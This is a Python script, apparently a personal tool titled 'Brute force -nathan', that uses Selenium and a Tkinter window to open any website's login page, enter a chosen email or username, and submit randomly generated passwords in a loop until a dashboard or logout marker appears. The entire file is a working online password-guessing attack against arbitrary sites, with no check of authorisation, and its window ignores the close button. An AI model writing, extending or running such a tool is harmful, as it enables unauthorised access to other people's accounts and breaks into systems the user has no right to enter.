import tkinter as tk
from tkinter import messagebox, font
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import threading
import time
import string
import random

last_attempt_index = -1
stop_flag = [False]
used_user_input = [None]

# Password generator (now realistic, not just sequential)
def generate_passwords(length=4, charset=""):
    while True:
        pwd = ''.join(random.choice(charset) for _ in range(length))
        yield pwd

# Main automation logic
def start_browser(url, target, pwd_length, charset):
    global last_attempt_index
    attempts_set = set()
    pwd_generator = generate_passwords(pwd_length, charset)

    try:
        driver = webdriver.Chrome()
        driver.get(url)
        time.sleep(2)  # Let page load

        email_filled = False
        attempt_count = 0

        while not stop_flag[0]:
            try:
                # Locate email field
                try:
                    email_input = driver.find_element(By.XPATH, '//input[@type="email" or contains(@name, "user") or contains(@id, "user")]')
                except:
                    email_input = driver.find_element(By.XPATH, '//input[contains(@placeholder, "email") or contains(@placeholder, "username") or contains(@name, "email") or contains(@id, "email")]')

                # Locate password field
                pass_input = driver.find_element(By.XPATH, '//input[@type="password"]')

                if not email_filled or target != used_user_input[0]:
                    email_input.clear()
                    email_input.send_keys(target)
                    used_user_input[0] = target
                    email_filled = True

                # Generate new unique password
                while True:
                    current_password = next(pwd_generator)
                    if current_password not in attempts_set:
                        attempts_set.add(current_password)
                        break

                pass_input.clear()
                pass_input.send_keys(current_password)
                pass_input.send_keys(Keys.RETURN)

                attempt_count += 1
                attempt_listbox.insert(tk.END, f"[{attempt_count}] {current_password}")
                attempt_listbox.yview(tk.END)

                time.sleep(0.5)  # Optional: speed vs reliability

                # Success detection (simple)
                if "dashboard" in driver.current_url or "logout" in driver.page_source.lower():
                    attempt_listbox.insert(tk.END, f"✅ SUCCESS: {current_password}")
                    stop_flag[0] = True
                    break

            except Exception as e:
                attempt_listbox.insert(tk.END, f"⚠️ Error during attempt: {e}")
                break

        driver.quit()
    except Exception as e:
        attempt_listbox.insert(tk.END, f"⚠️ Browser error: {e}")
        try:
            driver.quit()
        except:
            pass
        time.sleep(2)

def on_start():
    url = url_entry.get()
    target = target_entry.get()
    pwd_length_str = length_entry.get()

    if not url or not target or not pwd_length_str:
        messagebox.showwarning("Warning", "Please fill in all fields.")
        return

    try:
        pwd_length = int(pwd_length_str)
        if pwd_length < 1 or pwd_length > 100:
            messagebox.showwarning("Warning", "Password length must be 1 to 100.")
            return
    except ValueError:
        messagebox.showwarning("Warning", "Password length must be a number.")
        return

    selected_charset = ""
    if num_var.get():
        selected_charset += string.digits
    if letter_var.get():
        selected_charset += string.ascii_lowercase
    if special_var.get():
        selected_charset += "!@#$%^&*()-_=+[]{}|;:,.<>?/\\"

    if not selected_charset:
        messagebox.showwarning("Warning", "Select at least one charset (Number, Letter, Special).")
        return

    attempt_listbox.delete(0, tk.END)
    stop_flag[0] = False
    threading.Thread(target=start_browser, args=(url, target, pwd_length, selected_charset), daemon=True).start()

def on_keypress(event):
    if event.char == '+':
        stop_flag[0] = True
        root.destroy()

def disable_close():
    pass

# GUI
root = tk.Tk()
root.title("Brute force -nathan")
root.geometry("800x500")
root.configure(bg="black")
root.protocol("WM_DELETE_WINDOW", disable_close)
root.bind("<Key>", on_keypress)

default_font = font.Font(family="Consolas", size=12, weight="bold")

# Left Frame (Inputs)
left_frame = tk.Frame(root, bg="black")
left_frame.pack(side=tk.LEFT, fill=tk.Y, padx=20, pady=20)

url_label = tk.Label(left_frame, text="Website URL:", bg="black", fg="lightblue", font=default_font)
url_label.pack(anchor="w")
url_entry = tk.Entry(left_frame, width=40)
url_entry.pack()

target_label = tk.Label(left_frame, text="Email/Username:", bg="black", fg="lightblue", font=default_font)
target_label.pack(anchor="w", pady=(10, 0))
target_entry = tk.Entry(left_frame, width=40)
target_entry.pack()

length_label = tk.Label(left_frame, text="Password Length (1–100):", bg="black", fg="lightblue", font=default_font)
length_label.pack(anchor="w", pady=(10, 0))
length_entry = tk.Entry(left_frame, width=10)
length_entry.insert(0, "4")
length_entry.pack()

# Charset options
charset_label = tk.Label(left_frame, text="Character Set:", bg="black", fg="lightblue", font=default_font)
charset_label.pack(anchor="w", pady=(15, 5))

num_var = tk.IntVar(value=1)
letter_var = tk.IntVar(value=1)
special_var = tk.IntVar(value=0)

tk.Checkbutton(left_frame, text="Numbers (0–9)", variable=num_var, bg="black", fg="white", selectcolor="black", font=default_font).pack(anchor="w")
tk.Checkbutton(left_frame, text="Letters (a–z)", variable=letter_var, bg="black", fg="white", selectcolor="black", font=default_font).pack(anchor="w")
tk.Checkbutton(left_frame, text="Special (!@#...)", variable=special_var, bg="black", fg="white", selectcolor="black", font=default_font).pack(anchor="w")

# Start button
tk.Button(left_frame, text="▶ Start", command=on_start, bg="lightblue", fg="black", font=default_font).pack(pady=20)

# Right Frame (Attempts List)
right_frame = tk.Frame(root, bg="black")
right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=20, pady=20)

attempt_label = tk.Label(right_frame, text="Attempts Log", bg="black", fg="lightgreen", font=default_font)
attempt_label.pack(anchor="w")

attempt_listbox = tk.Listbox(right_frame, width=50, height=25, bg="black", fg="lightgreen", font=("Consolas", 11))
attempt_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

scrollbar = tk.Scrollbar(right_frame)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
attempt_listbox.config(yscrollcommand=scrollbar.set)
scrollbar.config(command=attempt_listbox.yview)

root.mainloop()
